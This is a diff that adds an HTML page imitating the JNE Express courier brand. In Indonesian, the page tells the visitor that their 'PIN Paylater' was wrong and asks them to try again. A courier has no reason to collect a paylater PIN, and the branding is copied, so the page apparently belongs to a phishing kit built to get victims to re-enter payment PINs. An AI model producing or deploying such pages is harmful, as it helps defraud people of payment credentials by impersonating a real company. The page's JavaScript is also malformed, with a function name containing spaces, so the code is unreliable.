@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PIN Salah - JNE Express</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            max-width: 480px;
+            margin: 0 auto;
+            background-color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .jne-blue { color: #0055AA; }
+        .jne-red { color: #E30613; }
+        button, a {
+            cursor: pointer;
+            -webkit-tap-highlight-color: transparent;
+        }
+    </style>
+</head>
+<body>
+
+<!-- ============== HEADER ============== -->
+<header class="bg-white px-5 py-4 flex justify-between items-center shadow-sm">
+    <div class="flex items-center">
+        <span class="text-3xl font-bold text-[#0055AA]">JNE</span>
+        <span class="text-sm font-bold text-[#E30613] ml-1">EXPRESS</span>
+    </div>
+    <button class="text-2xl text-gray-800">
+        <i class="fa-solid fa-bars"></i>
+    </button>
+</header>
+
+<!-- ============== KONTEN ============== -->
+<main class="flex-1 flex flex-col items-center justify-center px-6 pb-12">
+    <!-- Ikon Silang Merah -->
+    <div class="w-14 h-14 rounded-full bg-red-100 flex items-center justify-center mb-6">
+        <i class="fa-solid fa-xmark text-[#E30613] text-4xl"></i>
+    </div>
+
+    <h2 class="text-1xl font-medium text-gray-800 mb-2 text-center">
+        PIN Paylater yang Anda Masukkan Salah
+    </h2>
+    <p class="text-sm-50 text-center mb-1">
+        
+    </p>
+
+    <!-- Tombol Coba Lagi - Sudah Diperbaiki -->
+    <button onclick="Kurir - JNE Express" class="w-full max-w-xs bg-[#E30613] text-white py-3 rounded font-medium text-lg text-center hover:bg-red-700 transition active:bg-red-800">
+        COBA LAGI
+    </button>
+
+    <!-- Lupa PIN -->
+    <p class="text-center mt-6">
+        <a href="#" class="text-[#0055AA] text-sm hover:underline">Lupa PIN?</a>
+    </p>
+</main>
+
+<!-- ============== SCRIPT ============== -->
+<script>
+function Kurir - JNE Express() {
+    // Ganti "pin.html" dengan nama file halaman PIN kamu
+    window.location.href = 'bantuan.html';
+}
+</script>
+
+</body>
+</html>
